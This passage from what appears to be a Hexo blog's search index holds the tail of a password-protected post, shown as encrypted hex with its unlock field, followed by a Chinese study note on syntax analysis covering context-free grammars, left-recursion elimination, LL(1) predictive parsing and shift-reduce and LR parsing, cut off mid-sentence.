9be0a675ab968d7d708600f8de8212eb22339de830aee5fb7bdf438541ccf11ce285a1b56a2ed61beed5353cc4564a458814e296e087c6f3d5dd479725f60f0a1f0aa708a2d1f3bd6ca5dc6c085f574f8fe0d6ed2c0a495482140fb53e0f4ecf4a890fd8875cffc2cf0db7c99e518d0a1e5ee32c0e7247566cd75c0628ef1a53bd0d1cb7346f1de7db5fc26d12503cb7c7206a2adc693b1a8e9e631a6b0725ba7863ce2d1723695ded674bdd6af09320142d6df52fbf3436f7617a37588a362685023a0d37e39ebe0ef7086c492ba87a1f6d935a253a23e06d4b2c339d11d47b807f8aad8c3a8deed95e18b13ebbbb003f41da40650252e8886b44df88b7228e9637e1815ef611699629735f3d80547237574d2d4d8ac789cfd80a8162baf7e9c8f16ac2a5fd605dc1ef15befc1eeed6af937c1ea10d15774929f348682d9db7ea1fa20caa1ba6a10d75aea80ae8095ae1f760ce94119297f2d892bbc9ff2bfe470622952e77f3ae87ca791bf74ef3c589d2c217008900fdb89e21c70ed5660c3234b1a046b1658a30d3eef50ae45cb7af9042dff4997e6400e1bb68bad1a13d5458f2842815ece11c0fb48960aac96a8eeaf40c230701e47f417da3b8de93e0198b5907e12edad978e341c2428a7bfeb3d293212a1c8e0f7fcb3108fc20f393ea00ee319d49b9e626fe1051840e2a0f4a242f45cd5089fddd647b4d515dc11b1eaca21014a80c1a512d258b7fce23552f6fa8c1c3aa283578844cf31a8aa929900756be8d66af62b5bf2e5cd307c75c54e38f7907ac4571a3640b5cf624a3fdcf8c7127d3ad2997a3b49744602dfcc18319243da286c4604bfc16f26b084f04591017b5bf212e7344218f99a3f75bd154064d42b6bb3033cc1bc5482f7d9cf0d00f0dfcc9447b9b47faad46d1adc9acc43cfeac4b4293b71bb500fe5c70b6a0008aba770b61e8322a570aa371c63f91b8546403f79d08b958866aadaa800fef6f52c6d493d176cfc40c8f7545bb9d1e192b72099b60905616db5454204f9d40998969d7897045dbf741ae01c33b757346fde67fcdeb95f6b66f5cc2aefdacc37c34846423d9d33ddb0a7d9ead902dc28954cbcdfca602399cb25f58fd3b8f5910e3eda2fec70952f64363de65fcf09d6b1950be1d4d88b5d485367b53ee8713da5c9d40b6bf6f2cd46b584b8c49482842e906d790128f4c6e584f65f0e9b5e1ff0cdf77b510e267c97ddd3f7a15e870b871e9b0530bb9184094e8af079565e01fbd25918788f959eeaee32a3c102bb1b7772630aa01d77e7dba4cd534544edf4e0e6b4e6fe0f739796d3fd52b0c33f180c3d309e0338f455a25cb06c9d731a571d7e7edc7bf561ba2c89243488ae81728afa2e998b962f277631d0cbd1a31fae7d4ba45f646537260d6eba5da6a95f1e9309a66fe26134029ddd6a9074e7b0baa3e5eb20bf0a86ab0632f51e93c38763ff888a90fb04bf7e7374dd3bc0cb77f6722085a077c3ff0027932defd5ec9927febc74b2dea9118131efa5e570654794137e3ff1cb60d8bf56615c04b2a0372301db407326d1e8d8f6c1661de8ef22dfbf15cab26ab8cb7e9f29a3b49748c69f8667b0163395769f23cacef16245fc8743e48f24d78b2e1955a7f28e2592655ea1e89561988c976a9139e8b500395aedfed5ac7b41328743784eaf967f1bfcbb3e004bccb37325bec82dda59785b6c5a5542ca26cfbe4cf9a6ac88eadd1933bc7c1f3825f2e7df08a032c16c130268e21ef13b39a9659857cbbbd184977d6a0b9c209451389756e3de68265a99a8dfc89bfdb1e2d27e7d3a3f9e814918f74f0957ff539f1b38e0e6b956444a425c7e441b4b70ff4bfdfbbfd5bd5ee84cac3db6e8b8f898c4c9b1c01482d22a32d9c18da0dba8f53170783c3b39e77bd1e59e448024b77303ba4f91001df3a41d090181ca1aef072662f23754b779dcdb14ca1bb408314e72bf9ad551ccfb5d151d8f769ccd6a99109f76831fc0b778ee7cd012467bea5da8ce1cd0096967736a5e3934143e0b19d737ffcb92a1214a7caa2a4018f56c44d784cc859c24c9bd5454edb72ae4ecd1010766212ad84abea94d2f4e8cabba48c5cf5682eba543bf8b618bb179d32caef9b11757684e64dd7ff63bcde000515ddfda9128acb833bb74ef53c04080b80e8eedf9917275551215465e18d8d67bcdb2ca81ce6447e1d7030002926021efdf4bcf03bbdeffee280eae2a658384abec1b173cb4901fd31ede5914908b78de77c1d854d907a08d83ab788614a4ab1965be046d08f472cc8f6500620721653195503697d688d91357f2475a05f69def8d5b90210609d046b2fefee2bc9f5f9ecffe227489ea602d736fb47132aaa5c6fd9093f233ca93a0c9cb60a7ef9cb26a67cbed269ad2c83575785a955dd3bf3101088f6d9d3acf4614e4f017956c482c1f8535cc12a7706da2e18a6dd882ee97dad2d2630c7f2f15c3f86a443602ff32a1471361cb97ac5188985b7d71f9b24b6ea7a8832ac3513eaec5a45027c2b72de8b003402fcac5ea0edc6104907d769fd2225764958ad4f76f1e682acd426c652f088f4b84649aae422f7ee8e1b54dd21232fef941ca47a556ead0fa879db23d4fd8044209bd7e66d2c79c43a74a3e07dbf354926e29f5891e239cbb63061d1261de7269548cbdad018a0b5c8650eead988a282f5f76ce26fbd5eab3e1f3ddbab98e408cbf441fb4f0d2b967e0748e6fef29a3030b915fe6cafd5def35f058add83097380719018ef752f92cd3b8b642374bc987830de978b01b8454d3c3870a69ea30ef942d4d6020cb3424f5fb23242bbcc7068107124a9e782c185a85891853880a8d3835f3ba4e4ecee1ecbd9dd59e6f175dc9e2716755f7a5bf77c1e7096bc9ba93885f9dd769d8b3b34da657e290421f399869488b1420dba0f5c723360214ab8b8e8fd221721b6be15bd4d2805a900482f0a88d7a632a4193fa7ec47f2a74e76d4e37c4b9807e8ea07f767ac9eba91bbe9f6c5da72f557696836dceb0d13dc02b619d8ea12b0b0d5d66e6c3e2eec5884a642bcd4275f5d0918a42fffb60c5d3d032ce021b96a5c0a2f2080bde0d59d941bd863e4f4bcfbcd4222da1e2be02f2292e7255d30357e47d20c2875eb148fa8d142195963b6fb0e6f91793aa2a43ba3efb3f293129001a305532654aba562e02e4defa2d4715aa5e725ad0ed95d3e7f72f584ae9883d6e1e9360fb638105dafb156ae62325805f2519ea5644210c40d5114f6dec9401078a3772bbc98ee8760be580058534562d0e5be5db18e48b4aee401a15824cf249c7fe8bb21b05550f669c69eab705500ac090ba0ca8f5459e6ae5a2956ba077f6477eb52cf52a647fd883d24398feae4ed7e6325cdc479d4e069f5832cc9aa420aa5938c89ebc0dc8af144b710c20b1b44776eecbea8e0a6db8eef4903332bef27d8379021ba626d996cbfa545188447844d854982def7b369dc208df61f897fb5296ec1ab1de1418fa86b50c7c7b40a626b71dce6de595e56a81ed4e8ad50b52d12888089891a3af17f2ba6f8427034eb7e434dfd1b2c236b2743a37837133107dee99a63cfa87bdbcd84231f02b1a9c5bab4140c321d090558ca8a2d253e5bbf993c8a64646bc34087ccfc4fc2c808a03b87828f560560fc9e7188dbd01f8a6e4e0fdc6ea50cea7e4ef13c35515ffc54acea8312741054b550755ce370a9944fcb2eb4465067c44141c2028ee45bfed80560cbb720c46b1bf07076a72476ddc977106c2f1b7c1b1892710ff5271bd9f891839e6177e8054c51f27a4e6d7c598c6b4e1382e222fe2834407ac21f04c66d586462b6d6595d6b755836d365abbbf1e071b0d76ae30a0fa4c05deeb1282fbaeb1317d490458016acb1325a8218718b7b80d40c9a7a379b23359c3e5cee46d6158f421a373e6148057814872f0e7c558694ad5569cc4d2def749673db39581e72a6b2d04cdefc469e02b3c88b6ceea934a900e0b0e57534a780deb9493900b7bb1454c61f8664314bfb42c95c7d4ffc3557b8c10a93bd3ec594b7cbac1dba8b555aa04d65116e5d6600e9b1e2cdada91b2dcfa29422a03d59b3f6c3f1d5db9b45624e0334d3bc40fba572c84335771ab6eeca8ed88b2c560f79968bd8373a4f0682d898fc284f8e9891d92c86ff6599087cba5b8f95bd1aa5535c9834f7818251936de7789a97424951607c16e918e4ebef1fd4f73946c98dba6743738213ea9e411b3aedcf38fafcb3354c83cac78c02a0358e03cebef56489e7b442935185a758a6dcaa04122f8562ab5682614c54b31c078515157a46e142746d57b1eab5b76b952600c8daa17667518d2b763fcf05472d0a5a69769adcaa90fc2aa965d900e703e47211d12d546d611b15aee73d454dac02e3ded775812760c10e42735c190306dd7f3eeda1d493fd7f38fc223095347d25e814959ccf584244e77dce79378ca7ec84d97685c45c7670c5f15d82e289faf4c47cb03afbe4d19b9c63d30f7c21b33be341be9c9eeaea4cf63175b23fa1dee8c48917d898352d4da7646f90cf1baee76bdfc6f0b4963d3a7ba593eefec085050f71c1d19072360c6b59f261ea1484e69c2e68a47d1a637a04fefc764be421ad9de62d9645a9da4746cee282b619327bce6b175febb022a761d01a40b0c3532c8f36d86d217f636712c1a77db6fbce887974ad66cf306fa3cc09923f69da0ec5e234021b935c5fddc7f3d3a7eeee6cc38f9b1deabc46df7df458c5bd306fedabf44a63578ce3a14a6352f08316e891e4c7e686269557dfdb018feba7bf9e00a6eed349876d002b5084818fb89ad0b2193c65b5986eafa634715d3e0e5fc1070439d36c0e1329b1d7dac61c052d10953d69cfc90df41c7f565be5623b2afd472da22965d51b37d2dd7034959704cf7dc8f22e6df8d0924551b1b472eaeaa6b6f483fda43835a05926de6e14674997cbee9a41344b0941136fd88e16509262c4903abe2b5946e72eaf5e8e95928d5b451e7aad018be67a9326964a6241301571e48ac46554a26378c58a8fd88b55f5258bc9f8e2a33911a39daae6204343568141f4aabe1bfa695c58031f8b624be4ca21263b17c1ae8ec67d0a14f62a9343b760eab3f993303117c63ba66c100538871fbb8d9f7a6168d88d38284c83b71998ca1a73d85d5bf00eae6227ec1c7a1e2653fcfc278147403640e914aa341fef53c01119523afecc83dc1319e5df407bec944ce959ef6f5da98e7974269f3c1b9322ff155678c16c4f63eeca6e31225d1af9095b7c89298b6f755c4587e676af12ad4bedfc9073e627b6c93d6aa43e7d9f7008eb523ddf8d605bb5cacd9949b2bfe1bf24ce1438817e00ec39974cdca8b68d8f313ec57bae933a9d114df6a07ccbe5cc2580a2605efe6aebddbc90d66a8557259f32510eb16c8f1182ec850ea1ab27589a0d7ddc3f5ded22c7afc1bacc898418bcf35e347da2df495351b56507801eea28c8fed8db4bc87ec31ada822168bb89d0e943aacc13e6fbc9492c6d2ebc0c927e4a6d3e3147259c388517fae9598536896791d4bb2e8944139c64cc872f6c6b833c098ce3e5d9226a357512bf9b2e1358ce829650d8dd828d843b592b4854834a25735e1f1e381d9aeab1a546f19d01f8140cacd509bc9c693dff9f1d3c06cd426572a13b0ce6eeb13577f6ac8d5c072b00f4b5f95e985c3c988cab13928e472592affc669f012a38541f0340f98843ce6ad9f1300d943475c518400b7d0a5cfbceec53befb4e6aeb560b0c3d9bd55a3297a446635fbdfe78c44ef20f35491047844ef1c17b60713e0fb473efe5a94c36f4c36ef3ce2456cf7d88f91d077d71abddba60b6e47726131b262de341668e0398333cfb0dc2e0fbd5bc49eac8d22e4384c9086aa10eb73c25c4bca94f96e1631525d5efe76eaafab571e281c32af4625485158a62ff24604a23b08714972070dc5754871f2e0bfddba52ce3a9cd6b108e781691f38c3d2545e9310b5d57723039ebc2c2faf2aa1007f489b454d7109650f355fc56f7283aa02709925b7adda07d5d990a6f0e37d2b2e1ba625edbea5014abca29d2740b892b1c999fc83699fd98a9035cd6fc63063240ffa1f6ab286af834c1f626e4e77e2438191ea72b92266d906f50e685b42e2f6fe42ef9e420bbb8ed13b930d56955132d0c3dda8e2fa8ddc4d7340f266df59b25a6c74fdd59895bb40941fcc12916948f1dc2796190bbe14e15922970d8cab26f9170cc48d7a3c73e950be6e546538ca6c293dc54cb3cf3ded76b981b1f5e0ecb3aac25bec7d4809b6f547138932be3fb44c3b7210b6f573e877e25979e28087105f1df05c74a897e1708bc7a63e18ecd4a5c0087870fd367be21aff437f19377784e2cb5644c9b43cb1fe1d7f76492c1d6776bc1cd2b633ad931e2cc2189b200aed51ccdc361fec39e42084ddbbfbfc96f7de935934109fd40e4f93160278862bd824a5407625e538c9c002584c8fc66c743fe5327ddcfbcb66b093abd4c3587a2fd328facf3af46969132e8b2da635382b21dc65638f2ab1b7f0646b56ab025fc2bf24ecede7fd59ede6228ceac9c1f13aa1a5fd4a485e5dd48d7d0bd9500f00eaca1d7f9a31851f090e2d5dd5cea455fdce2264a215f6cb8dafeeafb07b5c5f80fd69b8334a0854c850ac55125495c0f49a814f62c2a1bd9250d0ae4593e32f3a405e4064034d00e15221f12985e19cf1d59ef57a8de45bdc2d118548330aad21c24647e2566954f7b678ed69a723a481f6e9c8e8f9498698fe220b15b073c15e1175c4f46b0f941d2355058efa0faaf06416ef6d34ff20c240c12d3e87390adea05724b5495032ed0cbb92f3148e7d44e4627494687676fcd3b05c2a27e371fbd0c69a2e41ceecfbf28f89bf81020e06a27714f41b4b5aa2d2cc6ed095cde3470277735c7d27c6dd41ed6240d4579fd7add82b1552131fe8ccd55d3fa69849be7cb819b34527a92cf77ea5009ff1f0afc197151d2f3fca12542210752827ce571a7dd293e2fc7e9dd5e7e1831a5bb0caceed72194c33efb85decc7b964d9f253a3c7b49f83f79391313ce326b0caee99e86c88affe638ccff68ae8dd633d383af8006ffd79d708a38e9f210b738dbc2058aa9e4cea6c3f78d1f779ec058b86eead9d8c8c47b4b4e62fca4b924cd3e8028aadf773a5eef8e727f983d584498f9d0845c688012e81234dacf33f5b44e1b6c621ab04ae645b8d8c7495ca3727e1b33c5360b3fd714146961ff3c67b83dd42fd13d5892689f557b416a1ea2ce55196601e89480aa32455439fe6f95f23559ba992eaeddf6ca80ca4d19fe968d67fdbf8fe655ea27bc568ef03c967c5912058e447de92b1f98567d8a485bdec79513829331e3e2126e66de2e187eed66e737def87c328df2771f0cf7e8cc41839122cfcf716ebca88416d733c4419044dd91b099b97ffa4e2d0d7e1acd99db926e350a901f0b6778a50effd1bda12f4db1fce92af9992bcf5da908d2753c0e2a7d343afe80d96c769d7d33069fbea7ca02fa6c3ec4d892e160d9d7c46d055d6dc82ca4b3bd006a6808d8db745aec5fdc0c508ce55795ece7acdd53ec570e55d7aad2d7269881525fbde95a82eafa5eead53ddecfdbe1bccaf66b5ed43f3ac71ed83893eacbe08c34736b9159fa4a9472ee913ac05def05c719cdfb6752a1688f547a47d0bacc410b0e878d229ad3ea46657739b6a7b948fc491dde31448cf7e4494d6040909edbb47429947716e9d50da442e9f9ee3756d7e0738b893e69c7dc8a3302d75d55f02a8c7a11b986006fb4fb993f45ff72a793ffeaa9878daa71f2e88a52e7f43ce0b853d32edacdceeaf4b8cf5ec6dbe8760defcba7f65e3f83deadbbf9022ec1e8a07dda897c53b3fd5495acd4255e60ee1e12fd8d8e5fc2ef59c20ff6a8254df005d88c3beb754e6ecb4a92fe68a973ad5b238136fe4f5029f57bbefd79dee97514022ae2bb75422f9919f8f7a7fb24b7655f0dee9ca9a547cd514b2fb09d36cdabbf8ca50f55dc9cc158282a5e8f21db883426fcf7fa8ec52f767a3a7148b9ae9f4aeb69afd1f347b2af2f026ded4fb5938dee1bce73d4102493d36eda1dfc9a7b7f727e1e42c122e03e06ea69113c45483d60d3490f338dacc71a03e6cf95001202dd76dfd11ad67c13333744fcde064a4c720b27356dd3aa35fb5ed903613db84afe1c901202e6103594529471d52c99ec31abb5a158aff8ddab69d90dc809a77f004c23ff2bb659309867e0f063f3a8bd8f861be83cf4dd1ac41d9430efae9999fc6a264a450af4ae673302624f28eb1ce8d7b3ea0292e744183b5400c306389ffd964499d6b42cf441b8aa715ccd222b63a96239e49c71442acd99bf3467ff3e23341ecff77b2e75173ffcbf1487eb8ebc39d78fc69c56bcd5a992a1c5272b076755dd92790ea00dd4791b5cd22b3f4b616fd7eb95c814836130c19554788c3e2b22d560e4ea31aa586a6245c6aac6a8a3fdd6095a25fabd4564ef40faa38f7a13610cbcf01dda270b096a682b5b31ba0a112bf2ac6f3b7212f00c52544c162592899cab8c09ca954868d73002fedf2f2af48c584680034b1907e3c0100bb17a6a1ceccb7e052299961f322a6b0e5b839f15e2e614b8538fd433799b651bd93dd52b73e850ee9da0ec4b25dade5d59d46f426add0d623cfb507c77af752620b3a3e77d453645ada24671f20358da3b7468ba9aa5a0840375a80da549d3e18991ff170439870f97524d278364745c18a61d81626d71edd3c2bc40a478f545398352a5c803ba71cd6568275302f45b5debcda13b1125bc792556fc88c5c04db490dcc9a21a47d84c34e74c7a828560fb3df599c80bda9b83a227ebfae7af990125f980507f6cd8790167a855a8d1b882665968fbc3bb51ebfdcf49525b7e0731447d12ee90862699b901882475e98d30ae3c48c7fae0758aecfde673cd7c52983408a96623453ec52c94859f71f9d99061b3d1d862b64bbceeff3a4ef4fb4da224700850842d6351d83f31145e9b27bb66eed699fed8d0eca19d292b7ee729c8ea7d1a90403cd964cadc4bad37d27f718102f3366b9b8d16369b44a0c08cb34a794609ee32665a6d347de5c7c430cc70a2bdbdafa817101ff73bda72f07df21f6c21ac065cc843402356febd9ec25f3e93cf43ca85e9cf8bdb30f634d143fea91c24191122fab586da14022463cd9426c1fcc813b9c21d77096c303ad996f6f8bc7a9531c8c978a9c39b1ecd0807f3bf33ff614514a95a593b27aa6809835ed4f4dba268f0a6a29623dbc9a6da9e9a731c95aef6cf46de0a2919e4c70978de0d0e1b00e0117e3bdd47c630b6c195508e9f5f210390cd87654c53ff7f3eb5eb9925bdc96fd8f4cb652d9524c66e61e675499f05647b75fe0529d5950430020cca304faeead51d4ac390fdac64c5388ddf35bc1633daa9655ea316fedf102fe0cfb6566aeff3bdcaa22ccdeafcca2fdeef5aa42f572a59fd6d4a424ebfe102177eb7769db57e753c393c6ae9164e444443c13447db61725349bce955c15d82b22009706471bd6f2247f234d23a31ef6ab614bc18ce66627636380bc893465c8ed5f85b0560f2610eb1ceb5bfe556810588d9c52d2f8354d8596b9697f2dab116bc0056ed235e8349c77a626c36d794c9d330caa8bb9c14692efc9d2ed13bcd8c1cd90ba472535e7ae4b932b1162e11419cfff61f77efbdfdb3ca1ddfcd738bcd1f871119c05b90aa14c1212e99fc9adc2b5e89f1287065befa1f42f152d108e5076d7cc6243910a638b3604539329bbcc8df460eea66be24526819204891ab1142eea21f54d01096cce28cad89badd372304c34b522deac7e34fe32e5058b6287e4b54198101b33abf6d78e82f676c860a74d22bfab4b567515c6370e9fc6deda08f31c53a9101503fecd1ffb9eed792dfb74484c0e8287e878db888bb592cd15aaf77f395301108b43f53155964f484abfbf98a253bd6791c03d3156f8b8d88e7aa789cdb9cb8171e541d772a7b446ea2678bb3019910b5d68c30fdf9de4457f9297f7500b7ece8d3f39ff0ed83de</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">特定的人,特定的时间</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>语法分析</title>
      <link href="/2023/Syntax-Analysis/"/>
      <url>/2023/Syntax-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h2><p>语法分析器接收词法分析器提供的记号串,检查它们是否能由源程序语言的文法产生.</p><p>语法分析器的输出是对词法分析器产生的记号流的分析树的某种表示.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201353760.png"></p><span id="more"></span><h2 id="上下文无关文法"><a href="#上下文无关文法" class="headerlink" title="上下文无关文法"></a>上下文无关文法</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201357869.png"></p><p>对于文法G产生的语言L(G),当且仅当文法G的开始符号S经过一步或多步推导得到终结符串w时,我们说终结符串w是G的句子.如果两个文法产生同样的语言,则称这两个文法等价.</p><h2 id="分析树和推导"><a href="#分析树和推导" class="headerlink" title="分析树和推导"></a>分析树和推导</h2><p>推导的每一步有两个选择:1)选择被替换的非终结符 2)选择用于替换该终结符的产生式.若每一步都替代最左非终结符的推导,这样的推导叫做最左推导.由最左推导得到的文法符号的串,称为该文法的左句型.</p><p>分析树可以看作推导的图形表示,但其不能显示出替代顺序的选择.比如图中两个E-&gt;id的替代顺序.所以每个分析树都有唯一的最左和最右推导.然而每一个句子不一定只有一个分析树.存在这样句子的文法G称为二义性文法.语法分析器在处理具有二义性的文法时,需要有消除二义性的规则,从而保留唯一一棵分析树.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201408736.png"></p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>实现部分阅读建议: 从文法识别开始阅读,当识别过程中提到文法的某种设计要求或特征时,阅读文法设计对应细节.</p><h2 id="文法设计"><a href="#文法设计" class="headerlink" title="文法设计"></a>文法设计</h2><h3 id="从NFA到上下文无关文法"><a href="#从NFA到上下文无关文法" class="headerlink" title="从NFA到上下文无关文法"></a>从NFA到上下文无关文法</h3><p>挺好理解的,每个状态转移对应一个产生式.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201426926.png"></p><h3 id="文法处理"><a href="#文法处理" class="headerlink" title="文法处理"></a>文法处理</h3><h4 id="消除左递归"><a href="#消除左递归" class="headerlink" title="消除左递归"></a>消除左递归</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201637505.png"></p><p>直接左递归可以用这种方式来消除.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201639863.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201651495.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201652315.png"></p><p>而对于非直接左递归产生式,如:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201645704.png"><br>进行如下的消除算法.<br>简单说说算法的思想:<br>先将所有的非终结符编号1-n,从A1开始对每一个非终结符Ai,对于Ai-&gt;Aj γ的产生式,用Aj的产生式替换Ai-&gt;Aj γ中的Aj,经过N轮后,对于任意产生式Ai-&gt;Aj γ,一定有j &gt;= i.意味着每次推导产生的非终结符的序号一定不小于原非终结符的序号,类似于单调的概念.故无法从一个非终结符推导出它的”祖先”非终结符.</p><p>也就消除(其实是转化)了非直接左递归.之前的消除直接左递归的算法就可以使用了.当然这是从宏观上看的该算法,实际上在算法中每次外循环后都已经消除Ai的非直接左递归,并完成了消除直接左递归的操作.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201644085.png"></p><h4 id="提取左因子"><a href="#提取左因子" class="headerlink" title="提取左因子"></a>提取左因子</h4><p>当不清楚应该用两个选择中的哪个来替换非终结符A时,可改写A产生式来推迟这种决定,直到看见足够多的输入能做出正确选择为止.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201728574.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201728434.png"></p><h3 id="LL-1-文法"><a href="#LL-1-文法" class="headerlink" title="LL(1)文法"></a>LL(1)文法</h3><blockquote><p>Predictive parsers, that is, recursive-descent parsers needing no backtracking,can be constructed for a class of grammars called LL(1). The first “L” in LL(1) stands for scanning the input from left to right, the second “L” for producing a leftmost derivation, and the “1” for using one input symbol of lookahead at each step to make parsing action decisions.</p></blockquote><h2 id="文法识别"><a href="#文法识别" class="headerlink" title="文法识别"></a>文法识别</h2><h3 id="自顶向下语法分析"><a href="#自顶向下语法分析" class="headerlink" title="自顶向下语法分析"></a>自顶向下语法分析</h3><p>自顶向下语法分析的目的是为输入字符串寻找最左推导,或者说,从根节点开始,自上而下,从左到右地为输入字符串建立一棵分析树.</p><h4 id="递归下降语法分析"><a href="#递归下降语法分析" class="headerlink" title="递归下降语法分析"></a>递归下降语法分析</h4><p>递归下降语法分析是自顶向下分析的一般形式,它可能需要回溯,也就是重复地扫描某段输入.</p><p>典型的递归下降语法分析算法:<br>为每个非终结符创建一个函数(procedure).当语法分析器开始分析非终结符A,非终结符A的对应的函数被调用.其选择一个非终结符的推导,若产生式的记号为终结符,右移输入指针表示成功匹配,若为非终结符Xi,调用Xi的函数.该算法用函数调用的栈隐式地记录了非终结符的处理顺序.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201443552.png"></p><p>该算法有两个点需要注意,这两个点也就是导致该算法需要回溯的原因.</p><ol><li>非终结符A可能有多个产生式,如何选择?递归下降语法分析的策略是遍历每一个产生式.</li><li>若选择的产生式不能匹配输入,触发一个non-ultimate failure,该错误使得输入回退到line1,也就是选择产生式的时.这意味着该算法需要在每次遍历选择时保存输入指针的位置.继续遍历,选择一个新的产生式.直到遍历完A的所有产生式,报告一个错误(该句子不是文法的语言).</li></ol><p>该算法有一个问题,对于含有A-&gt;Aa这样产生式的左递归文法,分析器在处理A时,不断的调用A的处理例程,但输入指针并没有前移,形成死循环.详见文法设计部分<code>消除左递归</code></p><h5 id="预测语法分析器"><a href="#预测语法分析器" class="headerlink" title="预测语法分析器"></a>预测语法分析器</h5><p>有的文法可以用不带回溯的递归下降语法分析器来构造.不带回溯的递归下降语法分析器称为预测语法分析器.</p><p>看这样一个例子.当前输入符号是a,此时正在处理的非终结符A有两个产生式:A-&gt;aB,A-&gt;bB,很明显我们应该选择前者,这便是预测,其实可以类比词法分析选择状态转移的过程.(<del>其实不太懂为什么叫预测,词法分析的时候也没DFA见叫预测有限有穷自动机</del>).</p><p>所以我们应该为输入符号和非终结符产生式创建一个关联,称作分析表(当然也有其他的结构).类比于词法分析中将NFA转换成DFA进行模拟,我们应该对文法<code>提取左因子</code>来保证不存在同一非终结符对于输入符号a的多种产生式.</p><h6 id="预测分析表的构造"><a href="#预测分析表的构造" class="headerlink" title="预测分析表的构造"></a>预测分析表的构造</h6><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201813871.png"><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201813745.png"></p><h6 id="表驱动的预测分析算法"><a href="#表驱动的预测分析算法" class="headerlink" title="表驱动的预测分析算法"></a>表驱动的预测分析算法</h6><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201815234.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201815613.png"></p><h3 id="自底向上语法分析"><a href="#自底向上语法分析" class="headerlink" title="自底向上语法分析"></a>自底向上语法分析</h3><p>自叶子节点向上建立分析树.<br><del>大量概念名词预警</del></p><p>归约: 一个匹配某产生式右部的字符串w被产生式左部替代的过程,推导的逆过程.<br>自底向上语法分析就是将一个句子一步步归约到文法的开始符号.</p><p>从定义可以看出,自底向上语法分析主要解决两个问题:</p><ol><li>什么时候进行归约</li><li>选择哪个产生式进行归约</li></ol><p>句柄: 一个符号串的句柄是和一个产生式右部匹配的字串,且对该字串的归约过程是最右推导逆过程的一步.</p><h4 id="移进归约分析法"><a href="#移进归约分析法" class="headerlink" title="移进归约分析法"></a>移进归约分析法</h4><p>移进归约分析法用栈来保存文法符号,用输入缓冲区来保存要分析的串w,用$来标记栈底和输入串的右端.初始时栈为空.</p><p>语法分析其将零个或多个输入符号压入栈,直到句柄B在栈顶出现为止,然后选择合适的产生式将句柄B归约,重复此过程直到发现错误或栈中只有开始符号且输入为空.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271156763.png"></p><p>选用栈来进行移进归约分析基于这样一个事实: 句柄总是出现在栈顶而不是栈中.<br>其实就是非终结符总是出现在上一个右句型的左部.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271159720.png"></p><p>但对于一些上下文无关文法,根据栈中的内容和下一个输入符号不能决定是移进还是归约,或不能决定按哪一个产生式进行归约,如二义性文法.这类文法不属于<code>LR(k)</code>类文法.</p><h5 id="算符优先语法分析"><a href="#算符优先语法分析" class="headerlink" title="算符优先语法分析"></a>算符优先语法分析</h5><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241539917.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241539926.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241540363.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541942.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541131.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541341.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241542555.png"></p><h5 id="LR语法分析"><a href="#LR语法分析" class="headerlink" title="LR语法分析"></a>LR语法分析</h5><p>为什么选择LR语法分析?简单来说就是,广泛有效性.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271218831.png"></p><p>LR语法分析器通过记录当前状态(state)来决定移进归约的操作,状态是项目(item)的集合,项目指示对某个产生式的识别状态(区分于语法分析器的状态).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271355698.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271355785.png"></p><blockquote><p>One collection of sets of LR(0) items,called the canonical LR(0) collection,provides the basis for constructing a deterministic finite automaton that is used to make parsing decisions.Such an automatonis called an LR(0) automaton.</p></blockquote><h6 id="SLR语法分析"><a href="#SLR语法分析" class="headerlink" title="SLR语法分析"></a>SLR语法分析</h6><p>LR语法分析器依靠自动机来完成移进归约操作的决定,<br>LR(0)规范集,其实就是LR语法分析器状态的集合(项目(item)集合(set)的集合(collection)),是构造该自动机的基础.</p><p>为文法G构造LR(0)规范集,需要增广文法,闭包(closure)函数,转移(goto)函数.</p><p>拓广文法: 加入一个新的开始符号和产生式S’ -&gt; 